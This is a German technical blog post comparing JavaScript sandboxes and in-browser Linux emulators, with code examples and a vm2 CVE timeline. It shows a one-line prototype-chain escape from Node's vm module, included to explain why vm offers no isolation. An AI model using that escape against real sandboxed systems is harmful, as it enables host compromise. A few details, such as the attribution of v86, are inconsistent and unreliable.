---
title: JavaScript-Lösungen für Linux-Kernel-Simulationen im Vergleich
description: Eine tiefgehende Analyse von Linux-Umgebungs-Nachbildungen in
  JavaScript/TypeScript.
date: 2026-05-28
authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "H8rYov9CVN9/48vkLp1wartNhPrquCZvxmxSragAIZByMCSJXUHblvfHgi8U1/LIFLmW3bP1Ejbgw/ijTA/MqA=="
---

# Jede JavaScript-Sandbox, Emulator, Simulator und Honeypot – im Vergleich

Okay, ich stecke schon seit einer Weile viel zu tief in diesem Kaninchenbau. Es hat damit angefangen, dass ich bei [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) geholfen habe – einem Projekt von Fortune (mehr dazu später) – und ständig gefragt wurde: „Was ist der Unterschied zu `v86`?" oder „Warum nicht einfach `vm2`?" – und mir wurde klar, dass ich keine saubere Antwort geben konnte, ohne das gesamte Ökosystem zu kartieren. Also, hier sind wir lol.

Es stellt sich heraus, dass es vier verschiedene Familien gibt – JS-Sandboxes, Linux-Emulatoren, Linux-Simulatoren und Honeypots – und sie überschneiden sich fast nie, obwohl sie ständig im selben Atemzug genannt werden. Jemand, der ein Plugin-System baut, greift zu `isolated-vm`. Jemand, der ein CLI-Tool demonstriert, greift zu `v86`. Jemand, der SSH-Bedrohungsanalyse betreibt, greift zu Cowrie. Sie lösen völlig unterschiedliche Probleme unter demselben vagen Überbegriff „Code in einer Kiste ausführen."

Ich habe viel Zeit damit verbracht, Quellcode, CVE-Berichte, Architektur-Dokumente und npm-Seiten zu lesen, um das zu schreiben. Das wird seeeehr lang – hol dir einen Kaffee, ernsthaft. Oder zwei.

> Kurzer Hinweis: `typescript-virtual-container` wird in diesem Artikel stark thematisiert, weil es diese Recherche ausgelöst hat. Ich habe versucht, fair zu allem anderen zu sein, aber behalte diesen Kontext im Hinterkopf.

---

## Teil 0 – Zuerst: Welches Problem löst du eigentlich?

Bevor wir eintauchen, lohnt es sich, genau zu definieren, wofür jede Familie da ist, weil die Begriffe schnell schlampig werden und die Leute sie ständig verwechseln (mich eingeschlossen, bevor ich mich hingesetzt und alles kartiert habe).

**JS-Sandboxes** isolieren JavaScript-Code vom Host-Node.js-Prozess. Das Bedrohungsmodell ist: nicht vertrauenswürdiger JS-Code, der `process.exit()` aufrufen, Dateien lesen oder Child-Prozesse starten könnte. Die Lösung ist eine Grenze um die V8-Ausführung. Diese Tools haben kein Konzept einer Linux-Shell, eines Dateisystems mit Berechtigungen oder SSH.

**Linux-Emulatoren** führen einen echten, unveränderten Linux-Kernel in einem CPU-Emulator (x86, RISC-V, OR1K) aus, der in JavaScript oder WebAssembly implementiert ist. Du bootest ein echtes Betriebssystem. Du bekommst echte Syscalls. Du bekommst Binärkompatibilität mit x86-kompilierten Programmen. Der Overhead ist enorm.

**Linux-Simulatoren** imitieren das *Verhalten* eines Linux-Systems, ohne einen echten Kernel auszuführen. Sie implementieren einen Shell-Interpreter, ein virtuelles Dateisystem und genug Unix-Semantik, um Programme und Menschen zu täuschen. Kein Kernel. Kein Wasm. Keine CPU-Emulation. Viel geringerer Overhead.

**Honeypots** sind dazu gebaut, Angreifer anzulocken und aufzuzeichnen, was sie tun. Sie sind in erster Linie keine Ausführungsumgebungen – sie sind Beobachtbarkeitswerkzeuge. Die Wiedergabetreue zum echten Linux-Verhalten ist nur insofern wichtig, als sie den Angreifer daran hindert, die Falle zu erkennen.

Mit diesem Rahmen hier, wo jedes Projekt in diesem Artikel landet:

```
JS-Sandbox:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux-Emulator:    v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux-Simulator:   typescript-virtual-container (einzigartig in diesem Bereich)
Honeypot:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal-Stack:    xterm.js + node-pty (kein Isolator, aber angrenzend)
```

---

## Teil 1 – JavaScript-Sandboxes

### 1.1 `vm` – der Node.js-Built-in (nicht das, was du denkst)

Die älteste Antwort auf „untrusted JS ausführen" in Node ist das eingebaute `vm`-Modul. Es gibt es seit v0.1, also greifen viele Leute zuerst danach – und verbrennen sich dann.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Was `vm` tatsächlich tut: Es erstellt einen neuen V8-Kontext (einen frischen Satz eingebauter Konstruktoren – `Object`, `Array`, `Function`, etc.) und führt Code darin aus, mit einer gemeinsamen Referenz auf das, was du in `sandbox` gelegt hast. Deine V8-Engine ändert sich nicht. Dein Prozess ändert sich nicht. Speicher wird geteilt.

Der Grund, warum `vm` keine Sicherheit bietet: Die JavaScript-Prototypenkette ist ein DAG, der alles zurück zu `Object.prototype` verbindet. Wenn du irgendein Objekt aus der Host-Realm in die Sandbox legst, kann der Gast seine Prototypenkette hochklettern und Host-Konstruktoren erreichen. Von `Function` aus kannst du `Function("return process")()` aufrufen und das echte `process`-Objekt wiederherstellen. Game over. Sofort.

```js
// Das läuft problemlos in vm – du bekommst das echte process-Objekt zurück
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Ich meine, die Node.js-Dokumentation selbst sagt: „Das vm-Modul ist kein Sicherheitsmechanismus. Verwende es nicht, um nicht vertrauenswürdigen Code auszuführen." Diese Warnung gibt es schon seit Ewigkeiten. Die Leute ignorieren sie ständig. Ich habe Produktions-Apps gesehen, die `vm` als Sandbox verwenden. Bitte tu das nicht xD

**Fazit**: ein Scope-Mechanismus, keine Sandbox. Verwende es, wenn du isolierte Variablenbereiche brauchst (Template-Engines, `eval`-ähnliche Funktionen, bei denen du den Code kontrollierst). Nie für nicht vertrauenswürdige Eingaben.

**Speicher**: vernachlässigbarer Overhead – derselbe V8-Heap wie der Host-Prozess.  
**Sicherheit**: keine gegen einen motivierten Angreifer.

---

### 1.2 `vm2` – der Community-Versuch und sein sehr langer Tod

`vm2` war die Antwort der Community auf `vm`s Escape-Problem. Die Kernidee: Jedes Objekt, das die Sandbox-Grenze überschreitet, in einen `Proxy` einwickeln, der den Eigenschaftszugriff abfängt, das Prototyp-Klettern blockiert und gefährliche Referenzen herausfiltert. Clevere Idee in der Theorie! In der Praxis weniger, wie wir sehen werden.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // wirft VMError, process nicht zugänglich
```

Mehrere Jahre lang funktionierte das einigermaßen gut. Aber die Angriffsfläche von JavaScript `Proxy` ist enorm. Jedes neue JS-Sprachfeature – Generatoren, Async-Iteratoren, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise`-interne Slots – ist ein potenzieller Bypass-Vektor.

Die CVE-Zeitleiste ist... heftig. Schau dir das an:

| Datum | CVE | Mechanismus |
|------|-----|-----------|
| Okt 2022 | CVE-2022-36067 | `Error.prepareStackTrace` Host-Kontext-Escape |
| Apr 2023 | CVE-2023-29017 | Unbehandelter Async-Error-Stack-Host-Objekt-Leak |
| Apr 2023 | CVE-2023-29199 | Exception-Sanitisierungs-Bypass via `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mai 2023 | CVE-2023-32314 | `Proxy` auf `Error.name` → `Function` → RCE |
| Jul 2023 | CVE-2023-37466 | Async-Funktion + Stack-Overflow + `Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Worker-Thread + eval Escape |

Drei kritische CVEs im selben Monat (April 2023). DREI. IN EINEM MONAT. Nach CVE-2023-37903 hat der Maintainer die Bibliothek offiziell als veraltet markiert mit der Nachricht: *„Die Bibliothek enthält kritische Sicherheitsprobleme und sollte nicht für die Produktion verwendet werden."*

Der Maintainer hat sie im Oktober 2025 mit Version 3.10.0 wiederbelebt und behauptet, alles damals Bekannte behoben zu haben. Ein neuer kritischer Escape (CVE-2026-22709, CVSS 9.8) wurde im Januar 2026 offengelegt, gefolgt von einem ganzen Batch von elf weiteren im Mai 2026. Elf. Das Muster hat sich nicht geändert, und ehrlich gesagt glaube ich nicht, dass es sich jemals ändern wird.

Das grundlegende Problem ist architektonisch – und das ist die Lektion, die das gesamte Ökosystem eine Weile brauchte, um zu lernen. Du kannst keine sichere Sandbox mit derselben Sprache bauen, die du sandboxt, auf derselben Engine, im selben Prozess. Die Angriffsfläche ist die gesamte V8-Implementierung – und V8 ist mehrere Millionen Zeilen C++, die sich ständig ändert. Jedes neue JS-Feature öffnet potenziell einen neuen Angriffspfad.

**Fazit**: Nicht für sicherheitskritische Anwendungen verwenden. Selbst in der neuesten Version werden alle paar Monate neue Bypässe entdeckt. Der Maintainer selbst hat dies offen eingeräumt.

---

### 1.3 `isolated-vm` – der, der tatsächlich funktioniert

`isolated-vm` verfolgt den korrekten Ansatz: V8s eigene Isolationsprimitive, das Isolate, verwenden. Jedes V8-Isolate hat seinen eigenen Heap, seinen eigenen Garbage Collector, seinen eigenen Satz eingebauter Funktionen und null gemeinsame Referenzen mit anderen Isolates.

Das ist die gleiche Grenze, die Chrome zwischen Tabs verwendet. Es ist eine echte Sicherheitsgrenze, kein Sprach-Trick auf Basis von Proxy.

```js
import ivm from "isolated-vm";

// Jedes Isolate ist ein eigener V8-Heap
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB-Limit
const context = await isolate.createContext();
const jail = context.global;

// Daten über die Grenze zu übertragen, erfordert explizite Serialisierung
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Kann nicht auf Host-Prozess, Host-Heap oder Host-Module zugreifen
  log.applySync(undefined, ["hallo aus dem Isolate"]);
`);
await script.run(context);

// Du kannst bei Timeout oder Speicherlimit hart terminieren
isolate.dispose(); // gibt den gesamten Heap frei
```

Die Typen `Reference` und `ExternalCopy` sind die explizite Kommunikationsbrücke. Ein `Reference` gibt dem Isolate ein aufrufbares Handle zu einer Host-Funktion – das Isolate kann sie aufrufen, aber nicht ihren Closure- oder Prototyp inspizieren. Ein `ExternalCopy` serialisiert einen Wert (strukturierte Klonierung) über die Heap-Grenze hinweg. Dieses explizite Bridge-Modell ist nicht bequem, aber es macht die Isolation real.

Du kannst harte Ressourcenlimits setzen: Speicher (das Isolate wird terminiert, wenn es das Limit überschreitet), Wanduhr-Timeout und CPU-Timeout. Die Terminierung ist echt – sie tötet das gesamte V8-Isolate, nicht nur ein JS-Timeout, das mit einem `while(true)` umgangen werden kann.

**Einschränkungen**: es ist nur JS. Du kannst darin kein Bash ausführen. Es gibt kein Konzept von Dateien, Berechtigungen, Netzwerk oder Prozessen. Es ist genau das richtige Werkzeug für benutzereingereichten JS-Code (Plugins, Formeln, Script-Hooks) und das falsche Werkzeug für alles andere. Die Autorin von `typescript-virtual-container` hat erwähnt, dass sie es früh in Betracht gezogen hat, bevor ihr klar wurde, dass „Shell-Befehle ausführen" und „JavaScript isolieren" grundlegend unterschiedliche Probleme sind.

**Speicher**: ~3–10 MB pro leerem Isolate, wächst mit Heap-Nutzung.  
**Sicherheit**: stark. Die V8-Isolate-Grenze ist die echte Isolationsprimitive.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` – eine separate JS-Engine, kompiliert zu Wasm

Ein anderer Ansatz: Anstatt innerhalb von V8 zu isolieren, eine vollständig separate JavaScript-Engine ausführen, die zu WebAssembly kompiliert wurde. Der Host läuft in V8/Node. Der Gast läuft in QuickJS-in-Wasm. Die Wasm-Sandbox bietet die Isolationsgrenze.

QuickJS ist wieder Fabrice Bellards Werk (derselbe Typ hinter QEMU, FFmpeg, JSLinux, TinyEMU – diese Person ist nicht echt, wie macht eine Person das alles?). Es ist eine kleine, spezifikationskonforme ES2023-JS-Engine, geschrieben in C, und wenn sie zu Wasm kompiliert ist, nur ~500 KB groß.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Läuft in QuickJS, komplett getrennt von V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS ist eine kleine, spezifikationskonforme ES2023-JavaScript-Engine, geschrieben in C. Kompiliert zu Wasm ist sie ~500 KB für die synchrone Variante, ~1 MB für die asynchrone (Asyncify) Variante. Die Speicherverwaltung ist manuell – jeder Wert, den du aus der VM extrahierst, muss explizit freigegeben werden, was etwas nervig ist, aber Cross-Boundary-GC-Überraschungen verhindert. Lustiger Tradeoff!

Der `@sebastianwessel/quickjs`-Wrapper fügt eine ergonomischere API hinzu, mit optionalem virtuellem Dateisystem, Fetch-Unterstützung und Node.js-Modul-Stubs:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Das Sicherheitsmodell unterscheidet sich von `isolated-vm`: Wasms lineares Speichermodell bedeutet, dass der Gast nicht direkt auf V8-Heap-Objekte zugreifen kann. Die Angriffsfläche ist die Host↔Wasm-Schnittstelle (Imports/Exports), nicht die gesamte JS-Sprache. Dies wird allgemein als robuster angesehen als Proxy-basiertes Sandboxing.

Der Haken: QuickJS hat nicht das gleiche Optimierungsniveau wie V8. Für CPU-intensive JS-Workloads ist es 5–20x langsamer als V8. Für kurze Schnipsel und nicht vertrauenswürdige Eval macht das meistens nichts.

**Speicher**: ~500 KB Wasm-Modul + Heap pro Instanz.  
**Sicherheit**: Wasm-Grenze, gilt als stärker als Proxy-basierte Ansätze.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno – Permissions-First-Runtime

Deno verfolgt eine völlig andere Philosophie: Anstatt innerhalb von Node zu sandboxen, eine neue Runtime bauen, die von Haus aus sicher ist. Ich mag diesen Ansatz sehr – das hätte Node.js von Anfang an sein sollen, ehrlich gesagt. Ryan Dahl (der ursprüngliche Node.js-Erfinder) hat Deno buchstäblich gemacht, weil er einige Node.js-Designentscheidungen bereut hat, was irgendwie verrückt ist, wenn man darüber nachdenkt.

Jede sensible Fähigkeit (Datei lesen, Datei schreiben, Netzwerk, Umgebungsvariablen, Subprozesse) erfordert ein explizites `--allow-*`-Flag:

```bash
# Das kann nur aus /data lesen, nichts weiter
deno run --allow-read=/data script.ts

# Das kann nur eine Domain fetchen
deno run --allow-net=api.example.com script.ts

# Keine Flags = gar keine Berechtigungen
deno run untrusted.ts # kann nicht lesen, schreiben, netzwerken, spawnen
```

Das Berechtigungsmodell ist auf Rust/OS-Ebene implementiert – es ist kein JS-Trick. Wenn Deno-Code `Deno.readFile()` aufruft, geht das durch eine Rust-Op, die die Berechtigungstabelle prüft, bevor sie das Dateisystem berührt. Du kannst es nicht aus JS umgehen, weil der Syscall nie stattfindet, wenn die Berechtigung nicht erteilt wurde.

Für die Ausführung von wirklich nicht vertrauenswürdigem Code bieten Deno Workers (Web Worker) ein zweites Isolate innerhalb desselben Prozesses, jedes mit eigenem Berechtigungssatz. Du kannst einen Worker mit null Berechtigungen starten und über `postMessage` mit ihm kommunizieren.

Deno 2 (veröffentlicht Oktober 2024) hat vollständige npm-Kompatibilität und Node.js-Kompatibilitäts-Shims hinzugefügt, was die Akzeptanz für serverseitige Anwendungsfälle deutlich verbessert hat.

**Der Tradeoff**: Denos Sicherheitsmodell ist hervorragend für Code, dem du teilweise vertraust. Für völlig nicht vertrauenswürdigen Code, der feindselig sein könnte, hilft das Berechtigungsmodell nicht – du brauchst eine Isolate-Grenze (`isolated-vm`) oder eine andere Engine (`quickjs-emscripten`), weil Deno immer noch V8 verwendet und ausgefeilte Angreifer V8-Level-Bugs finden können.

---

### 1.6 TC39 ShadowRealm – die Standard-Antwort (irgendwann)

Das JavaScript-Standardgremium (TC39) hat einen Vorschlag namens ShadowRealm, der versucht zu standardisieren, was `vm` und `vm2` zu tun versuchten, aber mit einem korrekten Sicherheitsmodell. Ein ShadowRealm erstellt einen isolierten JS-Ausführungskontext mit eigenem Satz intrinsischer Funktionen, keinem Zugriff auf die äußere Realm und einer sorgfältig kontrollierten Import/Export-Schnittstelle.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Separate Intrinsics, kein Zugriff auf äußere Realm
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm ist in Browsern (Chrome 90+, Firefox 105+), aber Stand 2026 noch nicht in Node.js stabil. Der TC39 Compartments-Vorschlag baut darauf für Modul-Level-Isolation auf. Dies sind die langfristigen standardisierten Antworten, aber sie sind noch nicht produktionsreif für serverseitige Node-Anwendungsfälle. Es ist eines dieser Dinge, bei denen du es von Meilenweit kommen siehst, aber es ist einfach... noch nicht da. Klassisches TC39 xD

---

### Sandbox-Familien-Zusammenfassung

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|---|
| **Isolationsgrenze** | keine (nur Scope) | Proxy (kaputt) | V8 Isolate | Wasm | V8 Isolate + Rust-Berecht. |
| **Speicherlimit** | ❌ | ❌ | ✅ hartes Limit | ✅ Wasm-Heap | teilweise |
| **CPU-Timeout** | ❌ | ✅ (umgehbar) | ✅ hart | ✅ | ✅ |
| **Sicherheit** | keine | kaputt | stark | stark | stark |
| **JS-Geschwindigkeit** | natives V8 | natives V8 | natives V8 | ~10x langsamer | natives V8 |
| **Browser** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node-Kompat.** | nativ | ✅ | ✅ | teilweise Shims | teilweise |
| **Status** | stabil | riskant (neue CVEs) | ✅ aktiv | ✅ aktiv | ✅ aktiv |
| **RAM-Overhead** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

Die Erkenntnis: Wenn dir Sicherheit wichtig ist, gibt es genau zwei echte Optionen – `isolated-vm` (Native Addon, V8 Isolate, volle JS-Geschwindigkeit) und `quickjs-emscripten` (Wasm, browserkompatibel, ~10x langsamer für rechenintensiven Code). Alles andere ist entweder „bitte nicht" (`vm`, `vm2`) oder eine Runtime, die ein völlig anderes Problem löst (Deno). ShadowRealm könnte dieses Bild irgendwann ändern, aber es ist noch nicht so weit.

---

## Teil 2 – Linux-Emulatoren in JavaScript

Hier wird es für mich richtig interessant. Das sind *echte* Emulatoren – sie implementieren einen CPU-Befehlssatz in JavaScript oder WebAssembly, booten ein echtes Linux-Kernel-Image und führen echte Userland-Binaries aus. Die Isolation kommt daher, dass Gast und Host nichts teilen: unterschiedliche Speicherbereiche, unterschiedliche Befehlsströme.

Der Preis, den du zahlst, ist enorm, aber was du bekommst, ist wirklich bemerkenswert: echtes Linux, tatsächlich laufend, in deinem Browser oder Node-Prozess. Das ist ziemlich verrückt, wenn man darüber nachdenkt, oder?

### 2.1 `v86` – x86-PC-Emulator in JS + Wasm JIT

`v86` von Fabrice (Copy auf GitHub) ist der leistungsfähigste Open-Source-x86-Emulator in JavaScript. Es begann um 2013 als reiner JS-Interpreter und hat sich zu einem JIT-kompilierten System entwickelt, bei dem x86-Basisblöcke on-the-fly zu WebAssembly übersetzt werden, was die Leistung dramatisch verbessert.

Was es emuliert:
- **CPU**: x86-32 (IA-32), Befehlssatz ungefähr auf Pentium-1-Niveau. Keine 64-Bit (x86-64) Unterstützung – das ist eine harte architektonische Grenze, kein fehlendes Feature.
- **FPU**: über JavaScripts `Float64Array`. x87 ist 80-Bit erweiterte Genauigkeit; JS-Doubles sind 64-Bit. Das bedeutet, dass Fließkomma-Ergebnisse geringfügig von einer echten CPU abweichen können.
- **Speicher**: konfigurierbar, wird auf ein `SharedArrayBuffer` oder `ArrayBuffer` im JS-Heap abgebildet.
- **Hardware**: 8254 PIT (Timer), 8259 PIC (Interrupt-Controller), 8042 Tastatur-Controller (PS/2), CMOS RTC, VGA mit SVGA-Erweiterungen und Bochs VBE, IDE-Controller, Disketten-Controller (8272A), NE2000-Netzwerkkarte.
- **BIOS**: verwendet SeaBIOS (Open-Source-x86-BIOS).

Der JIT funktioniert, indem er Basisblöcke (Sequenzen von x86-Befehlen ohne Sprünge) identifiziert, sie in eine WebAssembly-Funktion übersetzt, diese Funktion cached und sie bei späteren Ausführungen desselben Blocks aufruft. Heiße Codepfade erreichen native Wasm-Leistung. Kalte Pfälle fallen auf den JS-Interpreter zurück.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Serial-Ausgabe erfassen (Linux-Kernel-Konsole)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Eingabe an den Gast senden (in die Shell tippen)
emulator.serial0_send("ls /\n");
```

**Unterstützte Betriebssysteme**: Alpine Linux (exzellent), Ubuntu 16.04/18.04 (nur i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (mit Einschränkungen), MS-DOS.

**Boot-Zeit**: 15–40 Sekunden für Alpine Linux von einem sauberen Image. Das ist der echten Kernel-Initialisierung geschuldet – du kannst es nicht überspringen. Ja, deine Benutzer werden dasitzen und zusehen, wie ein Kernel-Boot-Sequenz in ihrem Browser abläuft. So ist das xD

**Speicherbedarf**: 100–256 MB pro Instanz. Allein der Wasm-JIT-Code-Cache kann für eine ausgelastete Linux-Instanz Dutzende MB erreichen.

**Node.js-Nutzung**: voll unterstützt. Kein DOM nötig – VGA-Ausgabe kann verworfen werden, wenn dich nur die serielle Ausgabe interessiert.

**Was du nicht tun kannst**: 64-Bit-Binaries ausführen, moderne Kernel-Features (eBPF, io_uring, etc.) verwenden oder mehr als eine handvoll Instanzen gleichzeitig laufen lassen, ohne Speicherlimits zu erreichen.

**npm**: [v86](https://www.npmjs.com/package/v86) – kontinuierlich aktualisiert, letzte Veröffentlichung innerhalb des letzten Tages zum Zeitpunkt des Schreibens.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux und TinyEMU – Bellards Arbeit, zweimal

JSLinux ist Fabrice Bellards eigener JavaScript-Linux-Emulator – der erste überhaupt, veröffentlicht 2011. Ich erwähne Bellard in diesem Artikel immer wieder, weil er einfach ständig auftaucht: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Der Mann ist etwas Besonderes. Ehrlich einer der beeindruckendsten einzelnen technischen Beiträge in der Softwaregeschichte, keine Übertreibung.

Das ursprüngliche JSLinux war ein reiner JS-x86-Interpreter. 2016 schrieb Bellard TinyEMU (einen RISC-V-Emulator in C), kompilierte es über Emscripten zu JavaScript, und das wurde zur Basis des heutigen JSLinux. Der aktuelle JSLinux ist also eigentlich C-Code, der JavaScript generiert – nicht handgeschriebenes JS.

Die technischen Notizen auf Bellards Seite sind lesenswert: Der aktuelle JSLinux läuft eine 32- oder 64-Bit-RISC-V-CPU (nicht x86) und emuliert VirtIO-Konsole, VirtIO-Netzwerk, VirtIO-Blockgerät und ein 9P-Dateisystem zur Dateifreigabe mit dem Host. Die JS-Demo ist mit Emscripten aus C kompiliert – es ist kein handgeschriebenes JS.

TinyEMU selbst unterstützt:
- RISC-V RV32IMAFDQC und RV64IMAFDQC (32 und 64-Bit, mit Float, Multiply, komprimierten Befehlen)
- x86 über KVM (nur nativ, keine Emulation – die JS-Version ist also nur RISC-V)
- VirtIO-Konsole, Netzwerk, Block, Eingabe, 9P-Dateisystem

TinyEMU hat eine über Emscripten bereitgestellte JavaScript-Demo. Es ist die Basis für JSLinux und wird auch von `container2wasm` verwendet (siehe Abschnitt 2.5).

**JSLinux-Status**: kein npm-Paket, keine programmatische API. Es ist eine Demo, die du im Browser öffnest. Die historische Bedeutung ist hoch – es hat das Konzept bewiesen. Praktische Nutzung als Bibliothek: keine.

**TinyEMU**: nicht auf npm, C-Quelle verfügbar unter [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k – OR1K-Emulator

jor1k ist ein OpenRISC 1000 (OR1K)-Emulator, geschrieben in JavaScript von Sebastian Macke. Es ist historisch interessant, weil jor1k die VirtIO-9P-Dateisystemunterstützung eingeführt hat, die Bellard später in TinyEMU und JSLinux integriert hat. Die gegenseitige Befruchtung zwischen diesen Projekten ist eng – sie leihen alle voneinander, was ehrlich gesagt eines der coolsten Dinge an Open-Source-Emulationsarbeit ist.

**Status**: wird nicht mehr aktiv gepflegt, kein npm-Paket. Mittlerweile archiviert. Wissenswert hauptsächlich aus historischem Kontext – falls jemand jor1k in einem Gespräch erwähnt, weißt du jetzt, was es ist :)

---

### 2.4 CheerpX – kommerzieller x86-Emulator für den Browser

CheerpX von Leaning Technologies ist der kommerzielle, produktionsreife x86-Linux-Emulator. Er ist nicht Open Source, aber deutlich leistungsfähiger als v86 für das Ausführen von echtem Debian/Ubuntu-Userland. Wenn du echtes VSCode im Browser brauchst, ist das das Richtige.

Wichtige Unterschiede zu v86:
- Unterstützt einen breiteren ISA (mehr x86-Erweiterungen, bessere glibc-Kompatibilität)
- IndexedDB-gestütztes Dateisystem im Browser (persistent über Seitenladevorgänge hinweg)
- pthread-Unterstützung über `SharedArrayBuffer` (erfordert COOP/COEP-Header – ja, diese nervigen Sicherheitsheader)
- Entwickelt zum Ausführen von VSCode, Python, Node.js und anderen echten Anwendungen – nicht nur minimale OS-Images
- Professioneller Support und SLA verfügbar (auch bekannt als: du kannst jemanden anschreien, wenn es kaputt geht)

Der typische Anwendungsfall ist „eine echte Linux-Anwendung ohne Server im Browser ausführen." Unternehmen nutzen es für browserbasierte IDEs, Programmier-Tutorials und interaktive Dokumentationen.

```js
// CheerpX API (vereinfacht)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js-Geschichte**: CheerpX ist Browser-first. Der zugrunde liegende Emulator würde theoretisch in Node funktionieren (es ist Wasm), aber die API und Dokumentation sind vollständig auf die Browser-Nutzung ausgerichtet. Serverseitige Nutzung wird nicht unterstützt.

**Speicher**: ähnlich wie v86 – 200+ MB für eine echte Debian-Instanz.  
**Preisgestaltung**: kostenlos für Open-Source-Projekte, kommerzielle Lizenz für Produktions-SaaS.  
**Dokumentation**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) – Node.js in Wasm, keine Linux-Emulation

WebContainers werden oft mit Linux-Emulatoren in einen Topf geworfen, sind aber architektonisch anders. Sie emulieren kein x86. Sie booten kein Linux. Sie führen Node.js aus, das mit WASI zu WebAssembly kompiliert wurde. Diese Unterscheidung ist sehr wichtig, und ich war selbst viel zu lange verwirrt darüber lol.

Ich glaube, die Verwirrung kommt vom Marketing – „Node.js in deinem Browser ausführen" klingt nach Emulation, aber es ist tatsächlich Node.js selbst, kompiliert zu Wasm, keine Linux-Emulation, die Node.js in einer VM ausführt. Ein völlig anderes Ding.

Die Architektur:
1. Node.js wird zu Wasm kompiliert (genauer gesagt eine benutzerdefinierte WASI-Runtime)
2. Ein Service Worker fängt Netzwerkanfragen vom emulierten Node.js-Server ab und leitet sie an den Browser-Tab weiter
3. Das Dateisystem lebt im Browser-Speicher (keine Festplatten-E/A)
4. npm ist eine benutzerdefinierte Implementierung, die für die Nutzung im Browser optimiert ist

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Dateien schreiben
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js-Befehle ausführen
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Weil es echtes Node.js (Wasm-kompiliert) ausführt, bekommst du echtes npm, echte Node.js-APIs und echte Modulauflösung. Du bekommst kein allgemeines Linux-Userland – du kannst keine Systempakete mit `apt` installieren, keine beliebigen kompilierten Binaries ausführen oder viel außerhalb des Node.js-Ökosystems tun.

**Browser-Anforderungen**: SharedArrayBuffer (erfordert COOP/COEP-Header), Service Worker-Unterstützung, modernes Wasm.

**Node.js-Geschichte**: ausschließlich für die Browser-Nutzung konzipiert. Die API funktioniert nicht außerhalb eines Browser-Kontexts.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Dokumentation**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm – Docker-Container kompiliert zu Wasm

`container2wasm` ist ein Tool (kein npm-Paket) von NTT, das ein Docker-Container-Image nimmt und in ein WebAssembly-Binary umwandelt, das in jedem Wasm-Host ausgeführt werden kann – einschließlich eines Browsers. Als ich das zum ersten Mal sah, habe ich nicht geglaubt, dass es funktioniert.

Der Mechanismus:
